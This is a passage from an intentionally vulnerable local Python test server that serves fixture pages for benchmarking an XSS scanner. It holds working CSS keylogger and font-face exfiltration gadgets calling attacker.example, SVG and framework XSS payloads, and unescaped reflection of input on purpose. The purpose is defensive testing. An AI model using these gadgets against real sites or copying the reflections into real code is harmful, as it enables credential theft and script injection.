        '  var m = document.cookie.match(new RegExp(name + "=([^;]+)"));'
        '  return m ? m[1] : "";'
        '}'
        '</script>'
        '</body></html>'
    )
    return body


def _sri_missing_script_page(q: str):
    """Page loading a cross-origin <script> without integrity=.

    The CDN compromise vector: if cdn.example.com is compromised, the
    attacker can inject arbitrary JS.
    """
    body = (
        '<html><body>'
        '<h1>Page with external script (no SRI)</h1>'
        '<script src="https://cdn.example.com/lib.js"></script>'
        '<script src="https://ajax.googleapis.com/jquery/3.6.0.min.js"></script>'
        '</body></html>'
    )
    return body


def _sri_missing_style_page(q: str):
    """Page loading a cross-origin stylesheet without integrity=."""
    body = (
        '<html><body>'
        '<h1>Page with external stylesheet (no SRI)</h1>'
        '<link rel="stylesheet" href="https://cdn.example.com/styles.css">'
        '<link rel="preload" as="script" href="https://cdn.example.com/preload.js">'
        '</body></html>'
    )
    return body


def _sri_broken_page(q: str):
    """Page with integrity= but no crossorigin (SRI silently disabled)."""
    body = (
        '<html><body>'
        '<script src="https://cdn.example.com/lib.js"'
        '        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"></script>'
        '</body></html>'
    )
    return body


def _sri_malformed_page(q: str):
    """Page with a malformed integrity= attribute (empty string)."""
    body = (
        '<html><body>'
        '<script src="https://cdn.example.com/lib.js" integrity=""></script>'
        '<script src="https://cdn.example.com/lib2.js" integrity="sha256-"></script>'
        '</body></html>'
    )
    return body


def _sri_insecure_page(q: str):
    """Page loading a script from an http:// origin (MITM risk)."""
    body = (
        '<html><body>'
        '<script src="http://cdn.example.com/lib.js"></script>'
        '</body></html>'
    )
    return body


def _sri_strong_page(q: str):
    """Control page with valid SRI + crossorigin + https (no finding)."""
    body = (
        '<html><body>'
        '<script src="https://cdn.example.com/lib.js"'
        '        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"'
        '        crossorigin="anonymous"></script>'
        '</body></html>'
    )
    return body


# ---------------------------------------------------------------------------
# Phase 28-4: Import Maps tampering fixtures
# ---------------------------------------------------------------------------
def _import_map_vuln_page(q: str):
    """Import map with cross-origin + insecure http:// entries."""
    body = (
        '<html><body>'
        '<script type="importmap">'
        '{"imports": {'
        '"react": "https://cdn.example.com/react@18.js",'
        '"lodash": "http://insecure.example.com/lodash.js",'
        '"utils": "/vendor/utils.js"'
        '}}'
        '</script>'
        '<script type="module">import "react";</script>'
        '</body></html>'
    )
    return body


def _import_map_reflect_page(q: str):
    """Import map that reflects the query param in the JSON (user-controlled)."""
    # Simulate server-side reflection of `q` into the import map JSON.
    # In a real app this would be SSR; here we just echo it.
    body = (
        '<html><body>'
        '<script type="importmap">'
        '{"imports": {"react": "https://cdn.example.com/react.js", "user": "' + q + '"}}'
        '</script>'
        '<script type="module">import "react";</script>'
        '</body></html>'
    )
    return body


def _import_map_late_page(q: str):
    """Import map that appears AFTER a module script (spec violation)."""
    body = (
        '<html><body>'
        '<script type="module">import "react";</script>'
        '<script type="importmap">'
        '{"imports": {"react": "https://cdn.example.com/react@18.js"}}'
        '</script>'
        '</body></html>'
    )
    return body


def _import_map_strong_page(q: str):
    """Control: import map with same-origin relative entries only (no finding)."""
    body = (
        '<html><body>'
        '<script type="importmap">'
        '{"imports": {"react": "/vendor/react.js", "utils": "/vendor/utils.js"}}'
        '</script>'
        '<script type="module">import "react";</script>'
        '</body></html>'
    )
    return body


# ---------------------------------------------------------------------------
# Phase 28-4: Sanitizer bypass fixtures
# ---------------------------------------------------------------------------
def _sanitizer_vuln_version_page(q: str):
    """Page loading a known-vulnerable DOMPurify version (1.0.7)."""
    body = (
        '<html><body>'
        '<!-- DOMPurify 1.0.7 - vulnerable to CVE-2020-26870 -->'
        '<script src="https://cdn.example.com/dompurify@1.0.7/dist/purify.min.js"></script>'
        '<div id="out"></div>'
        '<script>'
        'var clean = DOMPurify.sanitize(location.hash.substring(1));'
        'document.getElementById("out").innerHTML = clean;'
        '</script>'
        '</body></html>'
    )
    return body


def _sanitizer_unsafe_config_page(q: str):
    """Page with unsafe DOMPurify config (ADD_TAGS includes 'script')."""
    body = (
        '<html><body>'
        '<script src="https://cdn.example.com/dompurify@3.0.0/dist/purify.min.js"></script>'
        '<div id="out"></div>'
        '<script>'
        'var config = {ADD_TAGS: ["script"], ADD_ATTR: ["onerror"]};'
        'var clean = DOMPurify.sanitize(location.hash.substring(1), config);'
        'document.getElementById("out").innerHTML = clean;'
        '</script>'
        '</body></html>'
    )
    return body


def _sanitizer_to_innerhtml_page(q: str):
    """Sanitizer output passed directly to innerHTML (mXSS risk)."""
    body = (
        '<html><body>'
        '<script src="https://cdn.example.com/dompurify@3.0.0/dist/purify.min.js"></script>'
        '<div id="out"></div>'
        '<script>'
        'var clean = DOMPurify.sanitize(location.hash.substring(1));'
        'document.getElementById("out").innerHTML = clean;'
        '</script>'
        '</body></html>'
    )
    return body


def _sanitizer_missing_page(q: str):
    """innerHTML assigned from user source WITHOUT any sanitizer call."""
    body = (
        '<html><body>'
        '<div id="out"></div>'
        '<script>'
        'var payload = location.hash.substring(1);'
        'document.getElementById("out").innerHTML = payload;'
        '</script>'
        '</body></html>'
    )
    return body


def _sanitizer_strong_page(q: str):
    """Control: safe DOMPurify version + textContent sink (no finding)."""
    body = (
        '<html><body>'
        '<script src="https://cdn.example.com/dompurify@3.0.5/dist/purify.min.js"></script>'
        '<div id="out"></div>'
        '<script>'
        'var clean = DOMPurify.sanitize(location.hash.substring(1));'
        'document.getElementById("out").textContent = clean;'
        '</script>'
        '</body></html>'
    )
    return body


# ---------------------------------------------------------------------------
# Phase 30-1: CSS Injection (CSSI) fixtures
# ---------------------------------------------------------------------------
def _cssi_font_face_page(q: str):
    """@font-face unicode-range data exfiltration gadget.

    A real attacker uses this to leak secrets character-by-character via
    CSS-triggered HTTP requests (bypasses CSP script-src).
    """
    body = (
        '<html><head><style>'
        '@font-face {'
        '  font-family: exfil;'
        '  src: url(https://attacker.example/?leak=1);'
        '  unicode-range: U+0041;'
        '}'
        'body { font-family: exfil, sans-serif; }'
        '</style></head>'
        '<body><input value="secret_token_here"></body></html>'
    )
    return body


def _cssi_keylogger_page(q: str):
    """CSS keylogger: input[value^=...] selector + external url() callback."""
    body = (
        '<html><head><style>'
        'input[value^="a"] { background: url(https://attacker.example/?a); }'
        'input[value^="b"] { background: url(https://attacker.example/?b); }'
        'input[value^="c"] { background: url(https://attacker.example/?c); }'
        '</style></head>'
        '<body><form><input type="password" name="pw" value=""></form></body></html>'
    )
    return body


def _cssi_import_page(q: str):
    """@import loads external attacker-controlled stylesheet."""
    body = (
        '<html><head><style>'
        '@import url(https://attacker.example/evil.css);'
        'body { color: red; }'
        '</style></head>'
        '<body><h1>styled</h1></body></html>'
    )
    return body


def _cssi_cssom_page(q: str):
    """CSSOM sinks: element.style.cssText + insertRule + background."""
    body = (
        '<html><body>'
        '<div id="x"></div>'
        '<script>'
        'var el = document.getElementById("x");'
        'el.style.cssText = "color:red;";'
        'el.style.background = "url(https://attacker.example/?leak)";'
        'var sheet = document.styleSheets[0];'
        'sheet.insertRule("body { margin: 0; }", 0);'
        'sheet.insertRule("@import url(https://attacker.example/x.css)", 1);'
        '</script>'
        '</body></html>'
    )
    return body


def _cssi_template_page(q: str):
    """Template placeholder inside <style> block (server-side interpolation)."""
    body = (
        '<html><head><style>'
        'body { color: {{ userColor }}; background: ${ userBg }; }'
        '</style></head>'
        '<body><h1>themed</h1></body></html>'
    )
    return body


def _cssi_legacy_page(q: str):
    """Legacy CSS script execution: expression() + behavior + -moz-binding."""
    body = (
        '<html><head><style>'
        '#x { width: expression(alert(1)); }'
        '#y { behavior: url(xss.htc); }'
        '#z { -moz-binding: url(attacker.xml#xss); }'
        'body { background: url(javascript:alert(1)); }'
        '</style></head>'
        '<body><div id="x"></div><div id="y"></div><div id="z"></div></body></html>'
    )
    return body


def _cssi_strong_page(q: str):
    """Control: safe inline style, no exfil gadget, no dangerous CSSOM."""
    body = (
        '<html><head><style>'
        'body { color: #333; font-family: sans-serif; }'
        '</style></head>'
        '<body><div style="color:blue;">safe content</div></body></html>'
    )
    return body


def _cssi_dynamic_exfil_page(q: str):
    """Dynamic CSS keylogger built in JavaScript.

    The script builds a CSS rule combining a secret-input selector
    (input[value^=...]) with an external url() callback -- the classic
    CSS keylogger pattern that exfiltrates form field values without
    executing JavaScript.
    """
    body = (
        '<html><body>'
        '<form><input type="hidden" name="csrf" value="abc123"></form>'
        '<script>'
        'var chars = "abcdefghijklmnopqrstuvwxyz0123456789";'
        'var style = document.createElement("style");'
        'var rules = "";'
        'for (var i = 0; i < chars.length; i++) {'
        '  var c = chars[i];'
        '  rules += \'input[value^="\' + c + \'"] { background: url(https://attacker.example/?\' + c + \') }\';'
        '}'
        'style.textContent = rules;'
        'document.head.appendChild(style);'
        '</script>'
        '</body></html>'
    )
    return body


# ---------------------------------------------------------------------------
# Phase 30-2: Dangling Markup Injection fixtures
# ---------------------------------------------------------------------------

def _dangling_risk_page(q: str):
    """Dangling markup risk: href reflects user input + CSRF token downstream.

    The page reflects the ``q`` parameter into an ``href`` attribute
    (double-quote context) AND has a CSRF token in a hidden input
    downstream.  An attacker can inject a dangling URL attribute to
    capture the CSRF token via a resource load (bypasses CSP script-src).
    """
    body = (
        '<html><body>'
        f'<a href="/search?q={q}">search</a>'
        '<form action="/submit">'
        '<input type="hidden" name="csrfmiddlewaretoken" value="django_csrf_secret_abc">'
        '<input type="text" name="query">'
        '<button type="submit">Go</button>'
        '</form>'
        '</body></html>'
    )
    return body


def _dangling_hidden_page(q: str):
    """Dangling markup risk: src reflects user input + hidden input value.

    The page reflects ``q`` into an ``<img src>`` attribute and has a
    hidden input with a sensitive value downstream.
    """
    body = (
        '<html><body>'
        f'<img src="/img/{q}" alt="icon">'
        '<form action="/profile">'
        '<input type="hidden" name="session_id" value="sess_987654321_abcdef">'
        '</form>'
        '</body></html>'
    )
    return body


def _dangling_potential_page(q: str):
    """Dangling markup potential: sensitive data + URL attrs, no reflection.

    The page has a CSRF token and URL-bearing attributes (href/action)
    but does NOT reflect user input into any attribute.  This is a
    medium-severity "potential" finding -- if an attribute reflection
    were added, it would become a high-severity risk.
    """
    body = (
        '<html><body>'
        '<form action="/api/update">'
        '<input type="hidden" name="csrf" value="potential_csrf_token_xyz">'
        '<a href="/dashboard">Dashboard</a>'
        '<a href="/settings">Settings</a>'
        '</form>'
        '</body></html>'
    )
    return body


def _dangling_safe_page(q: str):
    """Control: no sensitive data near the reflection point.

    The page reflects ``q`` into an href attribute but has NO sensitive
    data (no CSRF tokens, no hidden inputs, no session meta tags) in the
    DOM.  The dangling markup layer must NOT report a finding.
    """
    body = (
        '<html><body>'
        f'<a href="/page?q={q}">link</a>'
        '<p>Welcome to our site. No sensitive data here.</p>'
        '<ul><li>Item 1</li><li>Item 2</li></ul>'
        '</body></html>'
    )
    return body


# ---------------------------------------------------------------------------
# Phase 30-3: Modern framework SSTI fixtures
# ---------------------------------------------------------------------------

def _fw_vue3_vhtml_page(q: str):
    """Vue 3 page with v-html directive (raw HTML injection sink)."""
    body = (
        '<html><head>'
        '<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>'
        '</head><body>'
        '<div id="app" data-v-abc12345></div>'
        '<script>'
        'const { createApp, ref } = Vue;'
        'createApp({'
        '  template: \'<div v-html="content"></div>\','
        '  setup() {'
        '    const content = ref("<img src=x onerror=alert(1)>");'
        '    return { content };'
        '  }'
        '}).mount("#app");'
        '</script>'
        '</body></html>'
    )
    return body


def _fw_angular_pipe_page(q: str):
    """Angular page with bypassSecurityTrustHtml pipe (sanitizer bypass)."""
    body = (
        '<html><head>'
        '<script src="https://unpkg.com/@angular/core/bundles/core.umd.js"></script>'
        '</head><body>'
        '<app-root _ngcontent-abc ng-version="15"></app-root>'
        '<div [innerHTML]="content | bypassSecurityTrustHtml">raw</div>'
        '<script>'
        '// Simulated Angular component with sanitizer bypass'
        'var content = "<img src=x onerror=alert(1)>";'
        '</script>'
        '</body></html>'
    )
    return body


def _fw_svelte_store_page(q: str):
    """Svelte page with {@html $store} (reactive store to raw HTML)."""
    body = (
        '<html><head>'
        '<script src="https://unpkg.com/svelte/internal/index.mjs"></script>'
        '</head><body>'
        '<div class="svelte-1abc23"></div>'
        '<script>'
        'import { writable } from "svelte/store";'
        'const store = writable("<img src=x onerror=alert(1)>");'
        '</script>'
        '<div>{@html $store}</div>'
        '</body></html>'
    )
    return body


def _fw_lit_unsafe_page(q: str):
    """Lit page with unsafeHTML() directive (raw HTML in lit template)."""
    body = (
        '<html><head>'
        '<script type="module">'
        'import { html, render } from "https://cdn.jsdelivr.net/npm/lit@3/+esm";'
        'import { unsafeHTML } from "https://cdn.jsdelivr.net/npm/lit@3/+esm/directives/unsafe-html.js";'
        'render(html`<div>${unsafeHTML("<img src=x onerror=alert(1)>")}</div>`, document.body);'
        '</script>'
        '</head><body>'
        '<my-element></my-element>'
        '</body></html>'
    )
    return body


def _fw_safe_page(q: str):
    """Control: safe framework usage (auto-escaped, no raw HTML sinks)."""
    body = (
        '<html><head>'
        '<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>'
        '</head><body>'
        '<div id="app" data-v-safe1234></div>'
        '<script>'
        'const app = Vue.createApp({'
        '  template: \'<div>{{ content }}</div>\','  # auto-escaped
        '  data() { return { content: "' + html.escape(q) + '" }; }'
        '});'
        'app.mount("#app");'
        '</script>'
        '</body></html>'
    )
    return body


# ---------------------------------------------------------------------------
# Phase 30-4: SVG XSS fixtures
# ---------------------------------------------------------------------------

def _svg_script_page(q: str):
    """Inline <script> inside SVG (svg_script vector)."""
    body = (
        '<html><body>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
        '<script type="text/javascript">alert("XSSentinel-svg-script")</script>'
        '<rect width="100" height="100" fill="red"/>'
        '</svg>'
        '</body></html>'
    )
    return body


def _svg_foreignobject_page(q: str):
    """<foreignObject> embedding <script> (svg_foreignobject_script vector).

    foreignObject is the canonical SVG-to-HTML escape hatch: it allows
    arbitrary HTML (including <script>) inside an SVG document."""
    body = (
        '<html><body>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">'
        '<foreignObject width="100%" height="100%">'
        '<body xmlns="http://www.w3.org/1999/xhtml">'
        '<script>alert("XSSentinel-svg-foreignobject")</script>'
        '</body>'
        '</foreignObject>'
        '</svg>'
        '</body></html>'
    )
    return body


def _svg_smil_page(q: str):
    """SMIL <set> with attributeName=onload (svg_set_event vector).

    SMIL animations can write to event-handler attributes (onload,
    onclick) via attributeName, achieving script execution without a
    <script> tag and bypassing CSP script-src in some browsers."""
    body = (
        '<html><body>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
        '<set attributeName="onload" to="alert(\'XSSentinel-svg-smil\')"/>'
        '<rect width="100" height="100" fill="blue"/>'
        '</svg>'
        '</body></html>'
    )
    return body


def _svg_use_jsuri_page(q: str):
    """<use href="javascript:..."> (svg_use_jsuri vector).

    The <use> element references another element by URL; a javascript:
    URI in the href triggers script execution in some browsers."""
    body = (
        '<html><body>'
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">'
        '<use href="javascript:alert(\'XSSentinel-svg-use-jsuri\')"/>'
        '<rect width="100" height="100" fill="green"/>'
        '</svg>'
        '</body></html>'
    )
    return body


def _svg_a_jsuri_page(q: str):
    """<a xlink:href="javascript:..."> (svg_a_jsuri vector).

    SVG <a> element with a javascript: URI in xlink:href executes
    script when the link is activated."""
    body = (
        '<html><body>'
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">'
        '<a xlink:href="javascript:alert(\'XSSentinel-svg-a-jsuri\')">'
        '<rect width="100" height="100" fill="yellow"/>'
        '</a>'
        '</svg>'
        '</body></html>'
    )
    return body


def _svg_safe_page(q: str):
    """Control: safe SVG with only benign shapes (no script/event/jsuri)."""
    body = (
        '<html><body>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
        '<rect x="10" y="10" width="80" height="80" fill="purple" rx="5"/>'
        '<circle cx="50" cy="50" r="20" fill="white"/>'
        '<text x="50" y="55" text-anchor="middle">Safe SVG</text>'
        '</svg>'
        '</body></html>'
    )
    return body


class H(BaseHTTPRequestHandler):
    # HTTP/1.1 keep-alive: without it every scan request
    # leaves a TIME_WAIT client socket, and a multi-thousand-
    # request benchmark run exhausts Windows ephemeral ports
    # (connects then stall with zero CPU).  Responses all set
    # Content-Length, which HTTP/1.1 requires.
    protocol_version = "HTTP/1.1"
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        # Pass request headers via side channel so handlers can reflect
        # User-Agent / Cookie values (for header/cookie XSS fixtures).
        ua = self.headers.get("User-Agent", "")
        cookie_hdr = self.headers.get("Cookie", "")
        qs["ua"] = [ua]
        # Parse the theme cookie (for the /cookie-reflect fixture).
        theme_val = "guest"
        for part in cookie_hdr.split(";"):
            k, _, v = part.strip().partition("=")
            if k.strip() == "theme":
                theme_val = v.strip()
        qs["cookie_theme"] = [theme_val]
        _set_last_query(qs)
        q = qs.get("q", [""])[0]
        # If path doesn't match a known page, treat the LAST path segment
        # as `q` so /path-reflect/<payload> and /error-404/<payload> work.
        page = PAGES.get(parsed.path)
        if page is None:
            # Try matching the path prefix (e.g. /path-reflect/xss -> /path-reflect).
            segments = [s for s in parsed.path.split("/") if s]
            if segments:
                base_path = "/" + segments[0]
                page = PAGES.get(base_path)
                if page is not None:
                    q = segments[1] if len(segments) > 1 else ""
        if page is None:
            # Real 404 -- reflects the path (for error page XSS testing).
            # URL-decode the path so percent-encoded payloads are rendered
            # in their raw form, matching real-world vulnerable servers
            # that echo decodeURIComponent(request.path) into the body.
            reflected_path = urllib.parse.unquote(parsed.path)
            body = (f'<html><body><h1>404 Not Found</h1>'
                    f'<p>{reflected_path}</p></body></html>')
            body = body.encode()
            self.send_response(404)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        result = page(q)
        body, status, content_type, extra_header, set_cookies = self._unpack(result)
        body = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        if extra_header:
            self.send_header("Content-Security-Policy", extra_header)
        # Phase 27-3: support multiple Set-Cookie headers (cookie tossing).
        if set_cookies:
            for sc in set_cookies:
                self.send_header("Set-Cookie", sc)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode("utf-8", "replace")
        parsed = urllib.parse.urlparse(self.path)
        data = urllib.parse.parse_qs(raw)
        q = data.get("q", [""])[0]
        # Phase 26: stash the raw POST body via the side channel so the
        # GraphQL handler can read the JSON-encoded query string.
        qs = _get_last_query().copy() if _get_last_query() else {}
        qs["raw_body"] = [raw]
        _set_last_query(qs)
        page = PAGES.get(parsed.path)
        if page is None:
            self.send_response(404)
            self.end_headers()
            return
        result = page(q)
        body, status, content_type, extra_header, set_cookies = self._unpack(result)
        body = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        if extra_header:
            self.send_header("Content-Security-Policy", extra_header)
        # Phase 27-3: support multiple Set-Cookie headers (cookie tossing).
        if set_cookies:
            for sc in set_cookies:
                self.send_header("Set-Cookie", sc)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    @staticmethod
    def _unpack(result):
        """Normalize handler return value to (body, status, content_type, extra_header, set_cookies)."""
        set_cookies = None
        if isinstance(result, tuple):
            if len(result) == 5:
                body, status, content_type, extra_header, set_cookies = result
            elif len(result) == 4:
                body, status, content_type, extra_header = result
            elif len(result) == 3:
                body, status, content_type = result
                extra_header = None
            elif len(result) == 2:
                body, status = result
                content_type = "text/html; charset=utf-8"
                extra_header = None
            else:
                body = str(result[0])
                status = 200
                content_type = "text/html; charset=utf-8"
                extra_header = None
        else:
            body = result
            status = 200
            content_type = "text/html; charset=utf-8"
            extra_header = None
        return body, status, content_type, extra_header, set_cookies

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    port = 8899
    print(f"vuln test server on http://127.0.0.1:{port}")
    HTTPServer(("127.0.0.1", port), H).serve_forever()
